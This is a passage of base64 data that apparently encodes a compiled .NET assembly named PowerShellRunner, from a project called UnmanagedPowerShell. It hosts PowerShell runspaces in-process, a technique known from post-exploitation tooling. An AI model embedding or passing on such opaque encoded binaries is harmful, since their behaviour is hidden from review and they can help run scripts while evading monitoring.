BEAAnsGAAAECisABiomAAIDfQYAAAQqAAATMAEADAAAAAsAABEAAnsHAAAECisABiomAAIDfQcAAAQqMgByLwwAcHMiAAAKegATMAEADAAAAAgAABEAAnsIAAAECisABiomAAIDfQgAAAQqMgByeQwAcHMiAAAKejIAcsUMAHBzIgAACnoTMAEADAAAAAkAABEAAnsKAAAECisABioTMAEADAAAAAkAABEAAnsLAAAECisABioyAHIHDQBwcyIAAAp6MgBybA4AcHMiAAAKejIAcrwOAHBzIgAACnoyAHIIDwBwcyIAAAp6EzABAAwAAAAKAAARAAJ7DQAABAorAAYqJgACA30NAAAEKgAAEzABAAwAAAAJAAARAAJ7BQAABAorAAYqJgACA30FAAAEKgAAEzABAAwAAAADAAARAAJ7DgAABAorAAYqJgACA30OAAAEKgAAEzADAAIBAAAMAAARAhIA/hUUAAABEgAfeCgrAAAKABIAH2QoLAAACgAGfQUAAAQCEgH+FRUAAAESARYoLQAACgASARYoLgAACgAHfQYAAAQCF30HAAAEAh8PfQgAAAQCFn0JAAAEAhIC/hUUAAABEgIg////fygrAAAKABICIP///38oLAAACgAIfQoAAAQCEgP+FRQAAAESAx9kKCsAAAoAEgMfZCgsAAAKAAl9CwAABAISBP4VFAAAARIEH2QoKwAACgASBCDoAwAAKCwAAAoAEQR9DAAABAISBf4VFQAAARIFFigtAAAKABIFFiguAAAKABEFfQ0AAAQCclIPAHB9DgAABAIoLwAACgAqAABCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAACUCQAAI34AAAAKAADACwAAI1N0cmluZ3MAAAAAwBUAAFQPAAAjVVMAFCUAABAAAAAjR1VJRAAAACQlAACcAgAAI0Jsb2IAAAAAAAAAAgAAAVcVogkJAgAAAPolMwAWAAABAAAANQAAAAUAAAAOAAAAOwAAADMAAAAvAAAADQAAAAwAAAADAAAAEwAAABsAAAABAAAAAQAAAAIAAAADAAAAAAAKAAEAAAAAAAYAhQB+AAoAywCpAAoA0gCpAAoA5gCpAAYADAF+AAYANQF+AAYAZQFQAQYANQIpAgYATgJ+AAoAqwKMAAYA7gLTAgoA+wKMAAYAIwMEAwoAM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EV4aXROZXN0ZWRQcm9tcHQATm90aWZ5QmVnaW5BcHBsaWNhdGlvbgBOb3RpZnlFbmRBcHBsaWNhdGlvbgBTZXRTaG91bGRFeGl0AEluc3RhbmNlSWQATmFtZQBVSQBDdXJyZW50Q3VsdHVyZQBDdXJyZW50VUlDdWx0dXJlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAX3NiAF9yYXdVaQBDb25zb2xlQ29sb3IAV3JpdGUAV3JpdGVMaW5lAFdyaXRlRGVidWdMaW5lAFdyaXRlRXJyb3JMaW5lAFdyaXRlVmVyYm9zZUxpbmUAV3JpdGVXYXJuaW5nTGluZQBQcm9ncmVzc1JlY29yZABXcml0ZVByb2dyZXNzAGdldF9PdXRwdXQAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMARGljdGlvbmFyeWAyAFBTT2JqZWN0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEARmllbGREZXNjcmlwdGlvbgBQcm9tcHQAQ2hvaWNlRGVzY3JpcHRpb24AUHJvbXB0Rm9yQ2hvaWNlAFBTQ3JlZGVudGlhbABQU0NyZWRlbnRpYWxUeXBlcwBQU0NyZWRlbnRpYWxVSU9wdGlvbnMAUHJvbXB0Rm9yQ3JlZGVudGlhbABnZXRfUmF3VUkAUmVhZExpbmUAU3lzdGVtLlNlY3VyaXR5AFNlY3VyZVN0cmluZwBSZWFkTGluZUFzU2VjdXJlU3RyaW5nAE91dHB1dABSYXdVSQBTaXplAF93aW5kb3dTaXplAENvb3JkaW5hdGVzAF9jdXJzb3JQb3NpdGlvbgBfY3Vyc29yU2l6ZQBfZm9yZWdyb3VuZENvbG9yAF9iYWNrZ3JvdW5kQ29sb3IAX21heFBoeXNpY2FsV2luZG93U2l6ZQBfbWF4V2luZG93U2l6ZQBfYnVmZmVyU2l6ZQBfd2luZG93UG9zaXRpb24AX3dpbmRvd1RpdGxlAGdldF9CYWNrZ3JvdW5kQ29sb3IAc2V0X0JhY2tncm91bmRDb2xvcgBnZXRfQnVmZmVyU2l6ZQBzZXRfQnVmZmVyU2l6ZQBnZXRfQ3Vyc29yUG9zaXRpb24Ac2V0X0N1cnNvclBvc2l0aW9uAGdldF9DdXJzb3JTaXplAHNldF9DdXJzb3JTaXplAEZsdXNoSW5wdXRCdWZmZXIAZ2V0X0ZvcmVncm91bmRDb2xvcgBzZXRfRm9yZWdyb3VuZENvbG9yAEJ1ZmZlckNlbGwAUmVjdGFuZ2xlAEdldEJ1ZmZlckNvbnRlbnRzAGdldF9LZXlBdmFpbGFibGUAZ2V0X01heFBoeXNpY2FsV2luZG93U2l6ZQBnZXRfTWF4V2luZG93U2l6ZQBLZXlJbmZvAFJlYWRLZXlPcHRpb25zAFJlYWRLZXkAU2Nyb2xsQnVmZmVyQ29udGVudHMAU2V0QnVmZmVyQ29udGVudHMAZ2V0X1dpbmRvd1Bvc2l0aW9uAHNldF9XaW5kb3dQb3NpdGlvbgBnZXRfV2luZG93U2l6ZQBzZXRfV2luZG93U2l6ZQBnZXRfV2luZG93VGl0bGUAc2V0X1dpbmRvd1RpdGxlAEJhY2tncm91bmRDb2xvcgBCdWZmZXJTaXplAEN1cnNvclBvc2l0aW9uAEN1cnNvclNpemUARm9yZWdyb3VuZENvbG9yAEtleUF2YWlsYWJsZQBNYXhQaHlzaWNhbFdpbmRvd1NpemUATWF4V2luZG93U2l6ZQBXaW5kb3dQb3NpdGlvbgBXaW5kb3dTaXplAFdpbmRvd1RpdGxlAGNvbW1hbmQAZXhpdENvZGUAZm9yZWdyb3VuZENvbG9yAGJhY2tncm91bmRDb2xvcgB2YWx1ZQBtZXNzYWdlAHNvdXJjZUlkAHJlY29yZABjYXB0aW9uAGRlc2NyaXB0aW9ucwBjaG9pY2VzAGRlZmF1bHRDaG9pY2UAdXNlck5hbWUAdGFyZ2V0TmFtZQBhbGxvd2VkQ3JlZGVudGlhbFR5cGVzAG9wdGlvbnMAcmVjdGFuZ2xlAHNvdXJjZQBkZXN0aW5hdGlvbgBjbGlwAGZpbGwAb3JpZ2luAGNvbnRlbnRzAFN5c3RlbS5SZWZsZWN0aW9uAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUN1bHR1cmVBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAENvbVZpc2libGVBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBBc3NlbWJseVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25vc3RpY3MARGVidWdnYWJsZUF0dHJpYnV0ZQBEZWJ1Z2dpbmdNb2RlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMASW5pdGlhbFNlc3Npb25TdGF0ZQBDcmVhdGVEZWZhdWx0AEF1dGhvcml6YXRpb25NYW5hZ2VyAHNldF9BdXRob3JpemF0aW9uTWFuYWdlcgBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AENvbW1hbmQAZ2V0X0l0ZW0AUGlwZWxpbmVSZXN1bHRUeXBlcwBNZXJnZU15UmVzdWx0cwBBZGQASW52b2tlAElEaXNwb3NhYmxlAERpc3Bvc2UAU3lzdGVtLlRocmVhZGluZwBUaHJlYWQAZ2V0X0N1cnJlbnRUaHJlYWQATm90SW1wbGVtZW50ZWRFeGNlcHRpb24ATmV3R3VpZABBcHBlbmQAU3RyaW5nAENvbmNhdABBcHBlbmRMaW5lAFRvU3RyaW5nAHNldF9XaWR0aABzZXRfSGVpZ2h0AHNldF9YAHNldF9ZAAAAF28AdQB0AC0AZABlAGYAYQB1AGwAdAABGUMAdQBzAHQAbwBtAFAAUwBIAG8AcwB0AACBd0UAbgB0AGUAcgBOAGUAcwB0AGUAZABQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF1RQB4AGkAdABOAGUAcwB0AGUAZABQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAQMKAAAPRABFAEIAVQBHADoAIAAAD0UAUgBSAE8AUgA6ACAAABNWAEUAUgBCAE8AUwBFADoAIAAAE1cAQQBSAE4ASQBOAEcAOgAgAACBYVAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgXNQAHIAbwBtAHAAdABGAG8AcgBDAGgAbwBpAGMAZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF9UAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAxACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgX1QAHIAbwBtAHAAdABGAG8AcgBDAHIAZQBkAGUAbgB0AGkAYQBsADIAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBZVIAZQBhAGQATABpAG4AZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYGBUgBlAGEAZABMAGkAbgBlAEEAcwBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAUlGAGwAdQBzAGgASQBuAHAAdQB0AEIAdQBmAGYAZQByACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAS0cAZQB0AEIAdQBmAGYAZQByAEMAbwBuAHQAZQBuAHQAcwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAEFLAGUAeQBBAHYAYQBpAGwAYQBiAGwAZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAIFjUgBlAGEAZABLAGUAeQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAU9TAGMAcgBvAGwAbABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAAS1MAZQB0AEIAdQBmAGYAZQByAEMAbwBuAHQAZQBuAHQAcwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAElTAGUAdABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAAAQDMblt1NfEOQala8P0EOErEAAi3elxWGTTgiQgxvzhWrTZONQQAAQ4OAyAAAQMGERUDBhIQBCAAERUDIAAOBCAAEhkEIAASDQQgABIdBCABAQgEKAARFQMoAA4EKAASGQQoABINBCgAEh0DBhIhAwYSFAggAwERJRElDgQgAQEOBiACAQoSKREgAxUSLQIOEjEODhUSNQESOQwgBAgODhUSNQESPQgMIAYSQQ4ODg4RRRFJCCAEEkEODg4OBCAAEhEEIAASTQQoABIRAwYRUQMGEVUCBggDBhElAgYOBCAAESUFIAEBESUEIAARUQUgAQERUQQgABFVBSABARFVAyAACAwgARQRWQIAAgAAEV0DIAACBiABEWERZQsgBAERXRFVEV0RWQcgAgERXRFZDSACARFVFBFZAgACAAAEKAARJQQoABFRBCgAEVUDKAAIAygAAgQgAQECBiABARGAnQUAABKAqQYgAQESgK0KAAISgLUSCRKAqQUgABKAuQUgABKAvQcVEjUBEoDBBSABEwAICSACARGAxRGAxQggABUSNQESMRAHBxIMEoCpEoC1EoC5Dg4CBAcBERUDBwEOBSACAQgIBAcBEhkEBwESDQUAABKAzQQHARIdBAAAERUFIAESIQ4FAAIODg4EBwESEQQHARElBAcBEVEEBwERVQMHAQgOBwYRURFVEVERURFREVUVAQAQUG93ZXJTaGVsbFJ1bm5lcgAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxNAAAKQEAJGRmYzRlZWJiLTczODQtNGRiNS05YmFkLTI1NzIwMzAyOWJkOQAADAEABzEuMC4wLjAAAAgBAAcBAAAAAAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAAAABhuOVAAAAAACAAAAHAEAABxOAAAcMAAAUlNEU0VA3dvTh/FOm4FSbVA+I7gLAAAAZTpcRG9jdW1lbnRzXFZpc3VhbCBTdHVkaW8gMjAxM1xQcm9qZWN0c1xVbm1hbmFnZWRQb3dlclNoZWxsXFBvd2VyU2hlbGxSdW5uZXJcb2JqXERlYnVnXFBvd2VyU2hlbGxSdW5uZXIucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgTwAAAAAAAAAAAAB+TwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcE8AAAAAAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhgAADwAgAAAAAAAAAAAADwAjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEUAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAALAIAAAEAMAAwADAAMAAwADQAYgAwAAAATAARAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFAAbwB3AGUAcgBTAGgAZQBsAGwAUgB1AG4AbgBlAHIAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAAEwAFQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAUABvAHcAZQByAFMAaABlAGwAbABSAHUAbgBuAGUAcgAuAGQAbABsAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAxADQAAABUABUAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEA